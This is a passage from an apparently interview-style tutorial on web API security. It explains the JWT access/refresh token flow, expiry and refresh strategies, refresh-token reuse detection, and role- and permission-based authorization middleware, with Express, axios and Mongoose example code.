  │  Response:                               │
  │  - accessToken: "eyJhbG..."              │
  │  - Set-Cookie: refreshToken=...          │
  │ <────────────────────────────────────── │
  │                                          │
  │ Store:                                   │
  │  - accessToken in memory                 │
  │  - refreshToken in HttpOnly cookie       │
  │                                          │


Step 2: Using Access Token
─────────────────────────────────────────────────────────
Client                                    Server
  │                                          │
  │  GET /api/profile                        │
  │  Authorization: Bearer <accessToken>     │
  │ ──────────────────────────────────────> │
  │                                          │
  │                                          │ Verify access token
  │                                          │ Token valid ✅
  │                                          │
  │  { user: {...} }                         │
  │ <────────────────────────────────────── │
  │                                          │


Step 3: Access Token Expired
─────────────────────────────────────────────────────────
Client                                    Server
  │                                          │
  │  GET /api/data                           │
  │  Authorization: Bearer <expiredToken>    │
  │ ──────────────────────────────────────> │
  │                                          │
  │                                          │ Verify access token
  │                                          │ Token expired ❌
  │                                          │
  │  401 { error: "Token expired" }          │
  │ <────────────────────────────────────── │
  │                                          │


Step 4: Refresh Access Token
─────────────────────────────────────────────────────────
Client                                    Server
  │                                          │
  │  POST /api/refresh                       │
  │  Cookie: refreshToken=...                │
  │ ──────────────────────────────────────> │
  │                                          │
  │                                          │ Verify refresh token
  │                                          │ Token valid ✅
  │                                          │ Generate new access token
  │                                          │
  │  { accessToken: "eyJNew..." }            │
  │ <────────────────────────────────────── │
  │                                          │
  │ Update accessToken in memory             │
  │                                          │


Step 5: Retry Original Request
─────────────────────────────────────────────────────────
Client                                    Server
  │                                          │
  │  GET /api/data                           │
  │  Authorization: Bearer <newAccessToken>  │
  │ ──────────────────────────────────────> │
  │                                          │
  │                                          │ Verify access token
  │                                          │ Token valid ✅
  │                                          │
  │  { data: [...] }                         │
  │ <────────────────────────────────────── │
  │                                          │
```

---

**Implementation:**

**Server-Side:**

```javascript
// Login - Generate both tokens
app.post("/api/login", async (req, res) => {
  // Verify credentials...

  // Generate access token (short-lived)
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },
    ACCESS_TOKEN_SECRET,
    { expiresIn: "15m" }
  );

  // Generate refresh token (long-lived)
  const refreshToken = jwt.sign(
    { userId: user.id, tokenType: "refresh" },
    REFRESH_TOKEN_SECRET,
    { expiresIn: "7d" }
  );

  // Store refresh token in database (for revocation)
  await db.refreshTokens.create({
    userId: user.id,
    token: refreshToken,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  });

  // Send refresh token as HttpOnly cookie
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  // Send access token in response body
  res.json({ accessToken });
});

// Refresh endpoint
app.post("/api/refresh", async (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: "No refresh token" });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);

    // Check if token exists in database (not revoked)
    const tokenInDb = await db.refreshTokens.findOne({
      token: refreshToken,
      userId: decoded.userId,
    });

    if (!tokenInDb) {
      return res.status(401).json({ error: "Refresh token revoked" });
    }

    // Generate new access token
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      ACCESS_TOKEN_SECRET,
      { expiresIn: "15m" }
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(401).json({ error: "Invalid refresh token" });
  }
});

// Logout - Revoke refresh token
app.post("/api/logout", async (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  // Remove refresh token from database
  await db.refreshTokens.deleteOne({ token: refreshToken });

  // Clear cookie
  res.clearCookie("refreshToken");

  res.json({ message: "Logged out successfully" });
});
```

**Client-Side (React Example):**

```javascript
import axios from "axios";

let accessToken = null;

// Interceptor to add access token to requests
axios.interceptors.request.use((config) => {
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`;
  }
  return config;
});

// Interceptor to handle token expiration
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If access token expired
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Request new access token using refresh token
        const { data } = await axios.post(
          "/api/refresh",
          {},
          {
            withCredentials: true, // Send refresh token cookie
          }
        );

        // Update access token
        accessToken = data.accessToken;

        // Retry original request with new token
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        // Refresh token also expired - redirect to login
        window.location.href = "/login";
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);

// Login function
export const login = async (credentials) => {
  const { data } = await axios.post("/api/login", credentials, {
    withCredentials: true, // Receive refresh token cookie
  });
  accessToken = data.accessToken;
  return data;
};

// Logout function
export const logout = async () => {
  await axios.post(
    "/api/logout",
    {},
    {
      withCredentials: true,
    }
  );
  accessToken = null;
};
```

---

**Comparison Table:**

| Feature              | Access Token        | Refresh Token          |
| -------------------- | ------------------- | ---------------------- |
| **Lifetime**         | Short (5-15 min)    | Long (7-30 days)       |
| **Purpose**          | Access resources    | Get new access token   |
| **Usage Frequency**  | Every request       | Only when expired      |
| **Storage**          | Memory/localStorage | HttpOnly cookie        |
| **Sent To**          | All API endpoints   | Only /refresh endpoint |
| **Revocation**       | Hard (just wait)    | Easy (delete from DB)  |
| **Security Risk**    | Lower (short-lived) | Higher (long-lived)    |
| **Contains**         | User data, roles    | Just user ID           |
| **Database Storage** | No                  | Yes (for revocation)   |

---

**Benefits of This Pattern:**

1. ✅ **Security**: Access token expires quickly (15 min)
2. ✅ **UX**: User stays logged in (7 days via refresh token)
3. ✅ **Revocation**: Can revoke refresh tokens from database
4. ✅ **XSS Protection**: Refresh token in HttpOnly cookie
5. ✅ **Reduced Risk**: Even if access token stolen, expires soon
6. ✅ **Scalability**: Access token still stateless
7. ✅ **Control**: Server can invalidate refresh tokens

---

**When Refresh Token Expires:**

```javascript
// Both tokens expired - user must login again
Client                                    Server
  │                                          │
  │  POST /api/refresh                       │
  │  Cookie: refreshToken=<expired>          │
  │ ──────────────────────────────────────> │
  │                                          │
  │                                          │ Verify refresh token
  │                                          │ Token expired ❌
  │                                          │
  │  401 { error: "Refresh token expired" }  │
  │ <────────────────────────────────────── │
  │                                          │
  │ Redirect to /login                       │
  │                                          │
```

---

**Best Practices:**

1. ✅ Access token: 5-15 minutes
2. ✅ Refresh token: 7-30 days
3. ✅ Store refresh tokens in database
4. ✅ Use HttpOnly cookies for refresh tokens
5. ✅ Implement token rotation (new refresh token on refresh)
6. ✅ Revoke refresh tokens on logout
7. ✅ Detect refresh token reuse (security breach)
8. ✅ Limit refresh tokens per user

---

### 6. How do you handle JWT expiration and refresh?

**JWT Expiration & Refresh Strategies:**

---

#### **Strategy 1: Simple Expiration (No Refresh)**

**Flow:**

```
1. User logs in → Gets JWT with 24h expiration
2. User makes requests with JWT
3. After 24 hours → JWT expires
4. User must login again
```

**Implementation:**

```javascript
// Generate JWT with expiration
const token = jwt.sign(
  { userId: user.id },
  SECRET,
  { expiresIn: "24h" } // Expires in 24 hours
);

// Verify JWT
try {
  const decoded = jwt.verify(token, SECRET);
  // Token is valid
} catch (error) {
  if (error.name === "TokenExpiredError") {
    // Token expired - user must login again
    return res.status(401).json({ error: "Token expired, please login" });
  }
}
```

**Pros:**

- ✅ Simple to implement
- ✅ No additional endpoints needed

**Cons:**

- ❌ Poor user experience
- ❌ User must login frequently
- ❌ No way to revoke tokens

---

#### **Strategy 2: Refresh Token Pattern** ⭐ Recommended

**Flow:**

```
1. User logs in → Gets:
   - Access token (15 min)
   - Refresh token (7 days)

2. User makes requests with access token

3. Access token expires → Get new one with refresh token

4. Refresh token expires → User must login again
```

**Implementation:**

**Step 1: Login - Generate Both Tokens**

```javascript
app.post("/api/login", async (req, res) => {
  // Verify credentials...

  // Generate short-lived access token
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email },
    ACCESS_TOKEN_SECRET,
    { expiresIn: "15m" }
  );

  // Generate long-lived refresh token
  const refreshToken = jwt.sign(
    { userId: user.id, type: "refresh" },
    REFRESH_TOKEN_SECRET,
    { expiresIn: "7d" }
  );

  // Store refresh token in database
  await db.refreshTokens.create({
    userId: user.id,
    token: refreshToken,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    createdAt: new Date(),
  });

  // Send refresh token as HttpOnly cookie
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  // Send access token in response
  res.json({ accessToken, expiresIn: 900 }); // 900 seconds = 15 min
});
```

**Step 2: Refresh Endpoint**

```javascript
app.post("/api/refresh", async (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: "No refresh token provided" });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);

    // Check if refresh token exists in database
    const storedToken = await db.refreshTokens.findOne({
      token: refreshToken,
      userId: decoded.userId,
    });

    if (!storedToken) {
      // Token was revoked
      return res.status(401).json({ error: "Refresh token revoked" });
    }

    // Check if expired
    if (new Date() > storedToken.expiresAt) {
      await db.refreshTokens.deleteOne({ _id: storedToken._id });
      return res.status(401).json({ error: "Refresh token expired" });
    }

    // Generate new access token
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      ACCESS_TOKEN_SECRET,
      { expiresIn: "15m" }
    );

    // Optional: Token rotation - generate new refresh token
    const newRefreshToken = jwt.sign(
      { userId: decoded.userId, type: "refresh" },
      REFRESH_TOKEN_SECRET,
      { expiresIn: "7d" }
    );

    // Replace old refresh token with new one
    await db.refreshTokens.updateOne(
      { _id: storedToken._id },
      {
        token: newRefreshToken,
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
        lastRefreshed: new Date(),
      }
    );

    // Send new refresh token as cookie
    res.cookie("refreshToken", newRefreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "strict",
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    // Return new access token
    res.json({ accessToken: newAccessToken, expiresIn: 900 });
  } catch (error) {
    if (
      error.name === "JsonWebTokenError" ||
      error.name === "TokenExpiredError"
    ) {
      return res.status(401).json({ error: "Invalid refresh token" });
    }
    res.status(500).json({ error: "Internal server error" });
  }
});
```

**Step 3: Client-Side Auto-Refresh**

```javascript
import axios from "axios";

// Store access token in memory
let accessToken = null;
let tokenExpiryTime = null;

// Set access token
const setAccessToken = (token, expiresIn) => {
  accessToken = token;
  // Calculate expiry time (refresh 1 minute before actual expiry)
  tokenExpiryTime = Date.now() + (expiresIn - 60) * 1000;
};

// Get access token
const getAccessToken = () => accessToken;

// Check if token needs refresh
const shouldRefreshToken = () => {
  return tokenExpiryTime && Date.now() >= tokenExpiryTime;
};

// Refresh token function
const refreshAccessToken = async () => {
  try {
    const { data } = await axios.post(
      "/api/refresh",
      {},
      {
        withCredentials: true, // Send refresh token cookie
      }
    );
    setAccessToken(data.accessToken, data.expiresIn);
    return data.accessToken;
  } catch (error) {
    // Refresh failed - redirect to login
    window.location.href = "/login";
    throw error;
  }
};

// Axios request interceptor
axios.interceptors.request.use(async (config) => {
  // Check if token needs refresh before making request
  if (shouldRefreshToken()) {
    await refreshAccessToken();
  }

  // Add access token to request
  const token = getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }

  return config;
});

// Axios response interceptor (backup for expired tokens)
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If 401 and haven't retried yet
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Try to refresh token
        const newToken = await refreshAccessToken();

        // Retry original request with new token
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        // Refresh failed - redirect to login
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);

// Login function
export const login = async (credentials) => {
  const { data } = await axios.post("/api/login", credentials, {
    withCredentials: true,
  });
  setAccessToken(data.accessToken, data.expiresIn);
  return data;
};

// Logout function
export const logout = async () => {
  await axios.post(
    "/api/logout",
    {},
    {
      withCredentials: true,
    }
  );
  accessToken = null;
  tokenExpiryTime = null;
};
```

---

#### **Strategy 3: Silent Refresh**

**Proactively refresh before expiration:**

```javascript
// Client-side: Auto-refresh 1 minute before expiry
let refreshTimeout = null;

const scheduleTokenRefresh = (expiresIn) => {
  // Clear existing timeout
  if (refreshTimeout) clearTimeout(refreshTimeout);

  // Schedule refresh 1 minute before expiry
  const refreshTime = (expiresIn - 60) * 1000;

  refreshTimeout = setTimeout(async () => {
    try {
      const { data } = await axios.post(
        "/api/refresh",
        {},
        {
          withCredentials: true,
        }
      );
      setAccessToken(data.accessToken, data.expiresIn);
      scheduleTokenRefresh(data.expiresIn); // Schedule next refresh
    } catch (error) {
      // Refresh failed - redirect to login
      window.location.href = "/login";
    }
  }, refreshTime);
};

// After login
const { accessToken, expiresIn } = await login(credentials);
scheduleTokenRefresh(expiresIn);
```

---

#### **Strategy 4: Sliding Sessions**

**Extend session on activity:**

```javascript
// Server: Extend expiration on each request
app.use(async (req, res, next) => {
  const refreshToken = req.cookies.refreshToken;

  if (refreshToken) {
    const storedToken = await db.refreshTokens.findOne({ token: refreshToken });

    if (storedToken) {
      // Extend expiration by 7 days
      await db.refreshTokens.updateOne(
        { _id: storedToken._id },
        { expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000) }
      );
    }
  }

  next();
});
```

---

#### **Strategy 5: Multiple Refresh Tokens (Device-based)**

**Different refresh token per device:**

```javascript
// Store device info with refresh token
await db.refreshTokens.create({
  userId: user.id,
  token: refreshToken,
  deviceId: req.body.deviceId,
  deviceName: req.body.deviceName,
  ipAddress: req.ip,
  userAgent: req.headers["user-agent"],
  expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
});

// User can see and revoke tokens per device
app.get("/api/sessions", authMiddleware, async (req, res) => {
  const sessions = await db.refreshTokens.find({ userId: req.user.id });
  res.json({ sessions });
});

app.delete("/api/sessions/:tokenId", authMiddleware, async (req, res) => {
  await db.refreshTokens.deleteOne({
    _id: req.params.tokenId,
    userId: req.user.id,
  });
  res.json({ message: "Session revoked" });
});
```

---

**Best Practices:**

1. ✅ **Short access token expiry** (5-15 minutes)
2. ✅ **Long refresh token expiry** (7-30 days)
3. ✅ **Store refresh tokens in database** (for revocation)
4. ✅ **Use HttpOnly cookies** for refresh tokens
5. ✅ **Implement token rotation** (new refresh token on each refresh)
6. ✅ **Detect token reuse** (possible security breach)
7. ✅ **Limit refresh tokens per user** (prevent abuse)
8. ✅ **Revoke all tokens on password change**
9. ✅ **Log refresh token usage** (for auditing)
10. ✅ **Implement rate limiting** on refresh endpoint

---

**Security: Refresh Token Reuse Detection**

```javascript
// Detect if refresh token is reused (possible theft)
app.post("/api/refresh", async (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  try {
    const decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);
    const storedToken = await db.refreshTokens.findOne({
      token: refreshToken,
      userId: decoded.userId,
    });

    if (!storedToken) {
      // Token was already used and rotated, or revoked
      // This could indicate token theft!

      // Revoke all refresh tokens for this user
      await db.refreshTokens.deleteMany({ userId: decoded.userId });

      // Alert security team
      await sendSecurityAlert(decoded.userId, "Refresh token reuse detected");

      return res.status(401).json({
        error: "Refresh token reuse detected. All sessions terminated.",
      });
    }

    // Normal refresh flow...
  } catch (error) {
    // Handle error...
  }
});
```

---

**Complete Example: React Hook**

```javascript
import { useState, useEffect } from "react";
import axios from "axios";

export const useAuth = () => {
  const [accessToken, setAccessToken] = useState(null);
  const [loading, setLoading] = useState(true);

  // Try to get new access token on mount
  useEffect(() => {
    refreshToken();
  }, []);

  // Auto-refresh before expiry
  useEffect(() => {
    if (!accessToken) return;

    // Refresh 14 minutes after getting token (1 min before 15 min expiry)
    const timeout = setTimeout(() => {
      refreshToken();
    }, 14 * 60 * 1000);

    return () => clearTimeout(timeout);
  }, [accessToken]);

  const refreshToken = async () => {
    try {
      const { data } = await axios.post(
        "/api/refresh",
        {},
        {
          withCredentials: true,
        }
      );
      setAccessToken(data.accessToken);
      setLoading(false);
    } catch (error) {
      setAccessToken(null);
      setLoading(false);
    }
  };

  const login = async (credentials) => {
    const { data } = await axios.post("/api/login", credentials, {
      withCredentials: true,
    });
    setAccessToken(data.accessToken);
  };

  const logout = async () => {
    await axios.post(
      "/api/logout",
      {},
      {
        withCredentials: true,
      }
    );
    setAccessToken(null);
  };

  return { accessToken, loading, login, logout, refreshToken };
};
```

---

### 7. What is Role-Based Access Control (RBAC)?

**Role-Based Access Control (RBAC)** is a method of regulating access to resources based on the roles assigned to users.

**Core Concepts:**

```
User → Role → Permissions → Resources
```

---

#### **Components:**

**1. Users**

- Individual people or services
- Example: John, Jane, Admin Bot

**2. Roles**

- Collection of permissions
- Examples: admin, editor, viewer, moderator

**3. Permissions**

- Specific actions allowed
- Examples: read:posts, write:posts, delete:users

**4. Resources**

- What is being accessed
- Examples: posts, users, comments, settings

---

#### **Simple RBAC Example:**

**Role Definitions:**

```javascript
const roles = {
  admin: {
    permissions: ["read:all", "write:all", "delete:all"],
  },
  editor: {
    permissions: ["read:posts", "write:posts", "edit:posts"],
  },
  viewer: {
    permissions: ["read:posts", "read:comments"],
  },
  user: {
    permissions: ["read:posts", "write:own-posts"],
  },
};
```

**User-Role Assignment:**

```javascript
const users = {
  user1: { id: 1, name: "John", role: "admin" },
  user2: { id: 2, name: "Jane", role: "editor" },
  user3: { id: 3, name: "Bob", role: "viewer" },
};
```

---

#### **Implementation in JWT:**

**Step 1: Include Role in JWT**

```javascript
// Server: Generate JWT with role
app.post("/login", async (req, res) => {
  // Verify credentials...

  const token = jwt.sign(
    {
      userId: user.id,
      email: user.email,
      role: user.role, // Include role
    },
    SECRET,
    { expiresIn: "24h" }
  );

  res.json({ token });
});
```

**Step 2: Create Role Middleware**

```javascript
// middleware/rbac.js

// Check if user has required role
const hasRole = (...allowedRoles) => {
  return (req, res, next) => {
    const userRole = req.user.role;

    if (!userRole) {
      return res.status(403).json({
        error: "Access denied. No role assigned.",
      });
    }

    if (allowedRoles.includes(userRole)) {
      next(); // User has required role
    } else {
      res.status(403).json({
        error: `Access denied. Requires one of: ${allowedRoles.join(", ")}`,
        currentRole: userRole,
      });
    }
  };
};

// Check if user has required permission
const hasPermission = (...requiredPermissions) => {
  return (req, res, next) => {
    const userRole = req.user.role;
    const userPermissions = roles[userRole]?.permissions || [];

    const hasAllPermissions = requiredPermissions.every((permission) =>
      userPermissions.includes(permission)
    );

    if (hasAllPermissions) {
      next();
    } else {
      res.status(403).json({
        error: "Insufficient permissions",
        required: requiredPermissions,
        current: userPermissions,
      });
    }
  };
};

module.exports = { hasRole, hasPermission };
```

**Step 3: Apply to Routes**

```javascript
const { hasRole, hasPermission } = require("./middleware/rbac");

// Only admins can access
app.delete("/api/users/:id", authMiddleware, hasRole("admin"), deleteUser);

// Admins and editors can access
app.post("/api/posts", authMiddleware, hasRole("admin", "editor"), createPost);

// Anyone with 'write:posts' permission
app.post(
  "/api/posts",
  authMiddleware,
  hasPermission("write:posts"),
  createPost
);

// Multiple permissions required
app.delete(
  "/api/posts/:id",
  authMiddleware,
  hasPermission("delete:posts", "moderate:content"),
  deletePost
);
```

---

#### **Hierarchical RBAC:**

**Role Hierarchy:**

```javascript
const roleHierarchy = {
  admin: ["admin", "moderator", "editor", "user", "guest"],
  moderator: ["moderator", "editor", "user", "guest"],
  editor: ["editor", "user", "guest"],
  user: ["user", "guest"],
  guest: ["guest"],
};

// Check if user's role includes target role
const hasRoleOrHigher = (userRole, requiredRole) => {
  return roleHierarchy[userRole]?.includes(requiredRole) || false;
};

// Middleware
const requireRole = (requiredRole) => {
  return (req, res, next) => {
    if (hasRoleOrHigher(req.user.role, requiredRole)) {
      next();
    } else {
      res.status(403).json({ error: "Insufficient privileges" });
    }
  };
};

// Usage
app.delete(
  "/api/comments/:id",
  authMiddleware,
  requireRole("moderator"), // Moderator or admin
  deleteComment
);
```

---

#### **Dynamic Permissions System:**

```javascript
// Database schema
const PermissionSchema = new mongoose.Schema({
  name: String, // 'read:posts'
  description: String, // 'Can read posts'
  resource: String, // 'posts'
  action: String, // 'read'
});

const RoleSchema = new mongoose.Schema({
  name: String, // 'editor'
  permissions: [{ type: mongoose.Schema.Types.ObjectId, ref: "Permission" }],
});

const UserSchema = new mongoose.Schema({
  email: String,
  password: String,
  roles: [{ type: mongoose.Schema.Types.ObjectId, ref: "Role" }],
});

// Check permissions dynamically
const checkPermission = (resource, action) => {
  return async (req, res, next) => {
    const user = await User.findById(req.user.id).populate({
      path: "roles",
      populate: { path: "permissions" },
    });

    // Collect all permissions from all roles
    const userPermissions = user.roles.flatMap((role) =>
      role.permissions.map((p) => `${p.action}:${p.resource}`)
    );

    const required = `${action}:${resource}`;

    if (userPermissions.includes(required)) {
      next();
    } else {
      res.status(403).json({
        error: "Permission denied",
        required,
        userPermissions,
      });
    }
  };
};

// Usage
app.delete(
  "/api/posts/:id",
  authMiddleware,
  checkPermission("posts", "delete"),
  deletePost
);
```

---

#### **Resource-Based (Attribute-Based) Authorization:**

```javascript
// Check if user owns the resource
const isOwner = (resourceName) => {
  return async (req, res, next) => {
    const resourceId = req.params.id;
    const userId = req.user.id;

    // Fetch resource
    const resource = await db[resourceName].findById(resourceId);

    if (!resource) {
      return res.status(404).json({ error: "Resource not found" });
    }

    // Check ownership
    if (resource.userId.toString() === userId.toString()) {
      next(); // User owns this resource
    } else {
      res.status(403).json({ error: "You can only modify your own resources" });
    }
  };
};

// Users can edit their own posts, admins can edit any post
app.put(
  "/api/posts/:id",
  authMiddleware,
  async (req, res, next) => {
    // Allow admins to bypass ownership check
    if (req.user.role === "admin") {
      return next();
    }
    // Otherwise check ownership
    return isOwner("posts")(req, res, next);
  },
  updatePost
);
```

---

#### **Complete RBAC Example:**

```javascript
// models/User.js
const UserSchema = new mongoose.Schema({
  email: String,
  password: String,
  role: {
    type: String,
    enum: ["admin", "moderator", "editor", "user", "guest"],
    default: "user",
  },
});

// config/permissions.js
const permissions = {
  admin: [
    "read:all",
    "write:all",
    "delete:all",
    "manage:users",
    "manage:roles",
  ],
  moderator: ["read:all", "write:posts", "delete:comments", "ban:users"],
  editor: ["read:posts", "write:posts", "edit:posts", "publish:posts"],
  user: ["read:posts", "write:own-posts", "comment:posts"],
  guest: ["read:posts"],
};

// middleware/rbac.js
const hasPermission = (resource, action) => {
  return (req, res, next) => {
    const userRole = req.user.role;
    const userPermissions = permissions[userRole] || [];

    const requiredPermission = `${action}:${resource}`;
    const hasWildcard = userPermissions.includes(`${action}:all`);

    if (userPermissions.includes(requiredPermission) || hasWildcard) {
      next();
    } else {
      res.status(403).json({
        error: "Access denied",
        required: requiredPermission,
        role: userRole,
      });
    }
  };
};

// routes/posts.js
// Anyone can read posts
app.get("/api/posts", getAllPosts);

// Users and above can create posts
app.post(
  "/api/posts",
  authMiddleware,
  hasPermission("posts", "write"),
  createPost
);

// Editors and above can publish posts
app.post(
  "/api/posts/:id/publish",
  authMiddleware,
  hasPermission("posts", "publish"),
  publishPost
);

// Only admins can delete any post
app.delete(
  "/api/posts/:id",
  authMiddleware,
  hasPermission("all", "delete"),
  deletePost
);

// Users can delete their own posts
app.delete("/api/posts/:id", authMiddleware, isOwner("posts"), deletePost);
```

---

**Benefits of RBAC:**

✅ **Centralized** permission management  
✅ **Scalable** - easy to add new roles/permissions  
✅ **Maintainable** - change role permissions without touching code  
✅ **Auditable** - clear who can do what  
✅ **Flexible** - supports complex permission schemes  
✅ **Secure** - principle of least privilege

---

### 8. How would you implement authorization in an API?

**Authorization** is determining what an authenticated user is allowed to do. Here's a complete implementation guide:

---

#### **Step 1: Choose Authorization Model**

**Options:**

1. **Role-Based (RBAC)** - Simple, based on roles
2. **Permission-Based** - More granular
3. **Attribute-Based (ABAC)** - Most flexible, uses attributes
4. **Resource-Based** - Ownership checks

**For this example, we'll use a combination.**

---

#### **Step 2: Database Schema**

```javascript
// models/User.js
const UserSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  role: {
    type: String,
    enum: ["admin", "moderator", "user"],
    default: "user",
  },
  permissions: [
    {
      type: String, // Custom permissions beyond role
    },
  ],
  isActive: { type: Boolean, default: true },
  createdAt: { type: Date, default: Date.now },
});

// models/Post.js
const PostSchema = new mongoose.Schema({
  title: String,
  content: String,
  authorId: { type: mongoose.Schema.Types.ObjectId, ref: "User" },
  status: {
    type: String,
    enum: ["draft", "published", "archived"],
    default: "draft",
  },
  createdAt: { type: Date, default: Date.now },
});
```

---

#### **Step 3: Define Permissions**

```javascript
// config/permissions.js
const PERMISSIONS = {
  // Post permissions
  "posts.read.all": "Read all posts",
  "posts.read.own": "Read own posts",
  "posts.create": "Create posts",
  "posts.update.all": "Update any post",
  "posts.update.own": "Update own posts",
  "posts.delete.all": "Delete any post",
  "posts.delete.own": "Delete own posts",
  "posts.publish": "Publish posts",

  // User permissions
  "users.read.all": "Read all users",
  "users.update.all": "Update any user",
  "users.delete.all": "Delete users",
  "users.manage.roles": "Manage user roles",

  // Comment permissions
  "comments.moderate": "Moderate comments",
  "comments.delete.any": "Delete any comment",
};

// Role-permission mapping
const ROLE_PERMISSIONS = {
  admin: [
    "posts.read.all",
    "posts.create",
    "posts.update.all",
    "posts.delete.all",
    "posts.publish",
    "users.read.all",
    "users.update.all",
    "users.delete.all",
    "users.manage.roles",
    "comments.moderate",
    "comments.delete.any",
  ],
  moderator: [
    "posts.read.all",
    "posts.update.all",
    "posts.delete.all",
    "comments.moderate",
    "comments.delete.any",
    "users.read.all",
  ],
  user: [
    "posts.read.all",
    "posts.read.own",
    "posts.create",
    "posts.update.own",
    "posts.delete.own",
  ],
};

module.exports = { PERMISSIONS, ROLE_PERMISSIONS };
```

---

#### **Step 4: Authorization Middleware**

```javascript
// middleware/authorization.js
const { ROLE_PERMISSIONS } = require("../config/permissions");
const Post = require("../models/Post");

// Get all permissions for a user
const getUserPermissions = (user) => {
  // Start with role-based permissions
  const rolePermissions = ROLE_PERMISSIONS[user.role] || [];

  // Add custom permissions
  const customPermissions = user.permissions || [];

  // Combine and remove duplicates
  return [...new Set([...rolePermissions, ...customPermissions])];
};

// Check if user has permission
const hasPermission = (...requiredPermissions) => {
  return async (req, res, next) => {
    const user = req.user;

    if (!user) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    const userPermissions = getUserPermissions(user);

    // Check if user has ALL required permissions
    const hasAll = requiredPermissions.every((perm) =>
      userPermissions.includes(perm)
    );

    if (hasAll) {
      req.userPermissions = userPermissions; // Attach for later use
      next();
    } else {
      res.status(403).json({
        error: "Access denied",
        required: requiredPermissions,
        message: "You do not have permission to perform this action",
      });
    }
  };
};

// Check if user has ANY of the permissions
const hasAnyPermission = (...permissions) => {
  return async (req, res, next) => {
    const user = req.user;
    const userPermissions = getUserPermissions(user);

    const hasAny = permissions.some((perm) => userPermissions.includes(perm));

    if (hasAny) {
      next();
    } else {
      res.status(403).json({
        error: "Access denied",
        required: `One of: ${permissions.join(", ")}`,
      });
    }
  };
};

// Check resource ownership
const isOwner = (resourceModel, resourceIdParam = "id") => {
  return async (req, res, next) => {
    const resourceId = req.params[resourceIdParam];
    const userId = req.user._id;

    try {
      const resource = await resourceModel.findById(resourceId);

      if (!resource) {
        return res.status(404).json({ error: "Resource not found" });
      }

      // Check if user owns the resource
      if (resource.authorId.toString() === userId.toString()) {
        req.resource = resource; // Attach resource to request
        next();
      } else {
        res.status(403).json({
          error: "Access denied",
          message: "You can only access your own resources",
        });
      }
    } catch (error) {
      res.status(500).json({ error: "Authorization check failed" });
    }
  };
};

// Combined: Permission OR ownership
const hasPermissionOrOwnership = (permission, resourceModel) => {
  return async (req, res, next) => {
    const userPermissions = getUserPermissions(req.user);

    // If user has permission, allow
    if (userPermissions.includes(permission)) {
      return next();
    }

    // Otherwise, check ownership
    return isOwner(resourceModel)(req, res, next);
  };
};

// Check if user is active
const isActive = (req, res, next) => {
  if (req.user && req.user.isActive) {
    next();
  } else {
    res.status(403).json({
      error: "Account suspended",
      message: "Your account has been deactivated",
    });
  }
};

module.exports = {
  hasPermission,
  hasAnyPermission,
  isOwner,
  hasPermissionOrOwnership,
  isActive,
  getUserPermissions,
};
```

---

#### **Step 5: Apply to Routes**

```javascript
// routes/posts.js
const express = require("express");
const router = express.Router();
const { authMiddleware } = require("../middleware/auth");
const {
  hasPermission,
  hasPermissionOrOwnership,
  isActive,
} = require("../middleware/authorization");
const Post = require("../models/Post");

// Public: Read all published posts
router.get("/posts", async (req, res) => {
  const posts = await Post.find({ status: "published" });
  res.json({ posts });
});

// Get single post
router.get(
  "/posts/:id",
  authMiddleware,
  hasPermission("posts.read.all"),
  async (req, res) => {
    const post = await Post.findById(req.params.id);
    res.json({ post });
  }
);

// Create post (any authenticated active user)
router.post(
  "/posts",
  authMiddleware,
  isActive,
  hasPermission("posts.create"),
  async (req, res) => {
    const post = await Post.create({
      ...req.body,
      authorId: req.user._id,
    });
    res.status(201).json({ post });
  }
);

// Update post (admin can update any, users can update own)
router.put(
  "/posts/:id",
  authMiddleware,
  isActive,
  hasPermissionOrOwnership("posts.update.all", Post),
  async (req, res) => {
    const post = await Post.findByIdAndUpdate(req.params.id, req.body, {
      new: true,
    });
    res.json({ post });
  }
);

// Delete post (admin can delete any, users can delete own)
router.delete(
  "/posts/:id",
  authMiddleware,
  hasPermissionOrOwnership("posts.delete.all", Post),
  async (req, res) => {
